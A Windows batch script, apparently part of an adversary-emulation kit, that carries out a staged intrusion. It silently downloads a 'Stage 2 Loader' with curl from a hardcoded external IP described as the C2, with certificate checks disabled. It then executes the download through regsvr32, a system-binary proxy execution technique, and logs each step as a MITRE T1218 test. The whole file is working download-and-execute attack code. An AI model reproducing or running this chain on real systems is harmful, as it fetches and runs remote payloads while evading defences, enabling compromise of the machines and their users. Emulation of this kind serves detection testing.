@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET variables)
SET aBcDeF12=%APPDATA%\49667\2ed740a0
SET xYz123Ab=c78d7d69.txt
SET qWeRtY78=https://3.144.153.50/test/stage/2/icon.png?QFxFQmg-R1dK
SET mNoPq9R=BALAM-S2B
SET sTuVwX0=QFxFQmg
SET ZxCvBnM1=R1dK
SET LkIjH2Gf=%PUBLIC%\\macula-simulations.log
SET FdSa3QwE=https://3.144.153.50/test

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM ----------------------------------------------------------------------
REM Step 1: Heartbeat fetch – download Stage 2 Loader from C2
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!mNoPq9R!][!sTuVwX0!]: heartbeat_start>> "!LkIjH2Gf!" 2>nul
curl -k -s -o "!aBcDeF12!\!xYz123Ab!" "!qWeRtY78!" >nul 2>&1
SET hb_err=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!mNoPq9R!][!sTuVwX0!]: heartbeat_complete=!hb_err!>> "!LkIjH2Gf!" 2>nul

REM ----------------------------------------------------------------------
REM Step 2: Position working directory to output folder
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!mNoPq9R!][!sTuVwX0!]: chdir_start>> "!LkIjH2Gf!" 2>nul
cd /d "!aBcDeF12!" >nul 2>&1
SET cd_err=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!mNoPq9R!][!sTuVwX0!]: chdir_result=!cd_err!>> "!LkIjH2Gf!" 2>nul

REM ----------------------------------------------------------------------
REM Step 3: Invoke Stage 2 Loader via LOLBIN (regsvr32)
REM ----------------------------------------------------------------------
echo [!tsvar!][DEBUG][!mNoPq9R!][!sTuVwX0!]: regsvr32_start>> "!LkIjH2Gf!" 2>nul
regsvr32.exe /s "!xYz123Ab!" >nul 2>&1
SET lolbin_err=!ERRORLEVEL!
echo [!tsvar!][DEBUG][!mNoPq9R!][!sTuVwX0!]: regsvr32_result=!lolbin_err!>> "!LkIjH2Gf!" 2>nul

REM ----------------------------------------------------------------------
REM Step 4: TTP Logging – System Binary Proxy Execution (T1218)
REM ----------------------------------------------------------------------
REM Generate timestamp with milliseconds for TTP log
for /f "tokens=1-4 delims=:.," %%a in ("%time%") do set ttp_ts=%date% %%a:%%b:%%c.%%d

if !lolbin_err! equ 0 (
    SET result=OK
    SET error=
) else (
    SET result=FAIL
    SET error=error=!lolbin_err!
)
echo [!ttp_ts!][TTP][!mNoPq9R!][!sTuVwX0!]: T1218^|System Binary Proxy Execution=!result!:!error!>> "!LkIjH2Gf!" 2>nul

ENDLOCAL
exit /b 0